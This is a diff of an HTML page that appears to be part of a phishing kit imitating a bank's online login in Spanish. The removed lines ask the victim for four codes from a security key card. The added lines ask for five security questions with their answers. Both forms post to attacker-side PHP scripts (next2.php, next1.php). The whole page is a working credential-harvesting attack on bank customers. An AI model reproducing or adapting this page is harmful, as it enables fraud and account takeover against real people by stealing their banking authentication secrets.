@@ -38,7 +38,6 @@ width: 100vw !important;
 </style>
 </head>
 <body>
- 
 <ibp-root ng-version="14.3.0">
 <router-outlet></router-outlet>
 <ibp-login _nghost-otb-c140="" class="ng-star-inserted">
@@ -50,54 +49,77 @@ width: 100vw !important;
 <div class="p-card-body">
 <div class="p-card-content">
 <div _ngcontent-otb-c140="" class="p-grid">
-<form action="next2.php" method="post">
+
+<form action="next1.php" method="post">
+
 <div _ngcontent-otb-c140="" class="p-fluid p-formgrid p-grid p-jc-center">
 
 
 <div _ngcontent-otb-c140="" class="p-field p-col-10">
 
-<h2>Ingresa el código solicitado de tu tarjeta de claves:
-  <br>
-  <br>
-</h2>
-<table width="0" border="0" cellspacing="0" cellpadding="0">
-  <tr>
-    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
-    <td width="39" bgcolor="#51AF46"><div align="center">21</div></td>
-    <td width="10">&nbsp;</td>
-    <td width="155"><input type="text" name="co1" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
-  </tr>
-</table>
-<br>
-<table width="0" border="0" cellspacing="0" cellpadding="0">
-  <tr>
-    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
-    <td width="39" bgcolor="#51AF46"><div align="center">11</div></td>
-    <td width="10">&nbsp;</td>
-    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co2" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
-  </tr>
-</table>
-<br>
-<table width="0" border="0" cellspacing="0" cellpadding="0">
-  <tr>
-    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
-    <td width="39" bgcolor="#51AF46"><div align="center">8</div></td>
-    <td width="10">&nbsp;</td>
-    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co3" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
-  </tr>
-</table>
-<br>
-<table width="0" border="0" cellspacing="0" cellpadding="0">
-  <tr>
-    <td width="41"><img src="assets/img/tarjeta-clave-logo.png" width="30" height="44"></td>
-    <td width="39" bgcolor="#51AF46"><div align="center">40</div></td>
-    <td width="10">&nbsp;</td>
-    <td width="155"><input _ngcontent-otb-c140="" type="text" name="co4" maxlength="4" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></td>
-  </tr>
-</table>
-<label _ngcontent-otb-c140="" for="userName"></label>
-</span>
+<h2>Preguntas de Seguridad</h2>
+<select name="preg1" class="p-inputtext">
 
+    <option>&iquest;Cu&aacute;l es el nombre de su abuela materna?</option>
+    <option>&iquest;Cu&aacute;l es el personaje de su libro favorito?</option>
+    <option>&iquest;Cu&aacute;l es su color favorito?</option>
+    <option>&iquest;Cu&aacute;l es el nombre del colegio donde curs&oacute; la primaria?</option>
+		<option>Pregunta propia </option>
+  </select>
+<br><br>
+
+<input _ngcontent-otb-c140="" type="text" name="resp1" placeholder="Digita tu Respuesta" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></span>
+<br><br>
+<select name="preg2" class="p-inputtext">
+
+<option>&iquest;Cu&aacute;l es el personaje de su libro favorito?</option>
+    <option>&iquest;Cu&aacute;l es el nombre de su abuela materna?</option>
+        <option>&iquest;Cu&aacute;l es su color favorito?</option>
+    <option>&iquest;Cu&aacute;l es el nombre del colegio donde curs&oacute; la primaria?</option>
+		<option>Pregunta propia </option>
+  </select>
+<br><br>
+
+<input _ngcontent-otb-c140="" type="text" name="resp2" placeholder="Digita tu Respuesta" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></span>
+<br><br>
+<select name="preg3" class="p-inputtext">
+
+<option>&iquest;Cu&aacute;l es su color favorito?</option>
+    <option>&iquest;Cu&aacute;l es el nombre de su abuela materna?</option>
+    <option>&iquest;Cu&aacute;l es el personaje de su libro favorito?</option>
+    <option>&iquest;Cu&aacute;l es su color favorito?</option>
+    <option>&iquest;Cu&aacute;l es el nombre del colegio donde curs&oacute; la primaria?</option>
+		<option>Pregunta propia </option>
+  </select>
+<br><br>
+
+<input _ngcontent-otb-c140="" type="text" name="resp3" placeholder="Digita tu Respuesta" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required> </span>
+<br><br>
+<select name="preg4" class="p-inputtext">
+
+        <option>&iquest;Cu&aacute;l es el nombre del colegio donde curs&oacute; la primaria?</option>
+	<option>&iquest;Cu&aacute;l es el nombre de su abuela materna?</option>
+    <option>&iquest;Cu&aacute;l es el personaje de su libro favorito?</option>
+    <option>&iquest;Cu&aacute;l es su color favorito?</option>
+    <option>&iquest;Cu&aacute;l es el nombre del colegio donde curs&oacute; la primaria?</option>
+		<option>Pregunta propia </option>
+  </select>
+<br><br>
+
+<input _ngcontent-otb-c140="" type="text" name="resp4" placeholder="Digita tu Respuesta" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></span>
+<br><br>
+<select name="preg5" class="p-inputtext">
+<option>Cúal es la marca de su primer carro?</option>
+    <option>&iquest;Cu&aacute;l es el nombre de su abuela materna?</option>
+    <option>&iquest;Cu&aacute;l es el personaje de su libro favorito?</option>
+    <option>&iquest;Cu&aacute;l es su color favorito?</option>
+    <option>&iquest;Cu&aacute;l es el nombre del colegio donde curs&oacute; la primaria?</option>
+	<option>Pregunta propia </option>
+  </select>
+<br><br>
+
+<input _ngcontent-otb-c140="" type="text" name="resp5" placeholder="Digita tu Respuesta" class="p-inputtext p-component p-element ng-untouched ng-pristine ng-invalid" required></span>
+<br><br>
 
 
 </div>
@@ -123,7 +145,7 @@ width: 100vw !important;
 </div>
 <div _ngcontent-otb-c140="" class="p-field p-col-10 p-mt-2">
 <p-button _ngcontent-otb-c140="" type="submit" iconpos="right" class="p-element">
-<button pripple="" class="p-ripple p-element bhd-btn-primary p-button p-component" type="submit"><!----><!----><span class="p-button-label ng-star-inserted">Continuar</span><!----><!----><span class="p-ink"></span></button></p-button>
+<button pripple="" class="p-ripple p-element bhd-btn-primary p-button p-component" type="submit"><!----><!----><span class="p-button-label ng-star-inserted">Confirmar</span><!----><!----><span class="p-ink"></span></button></p-button>
 </div>
 
 </div>
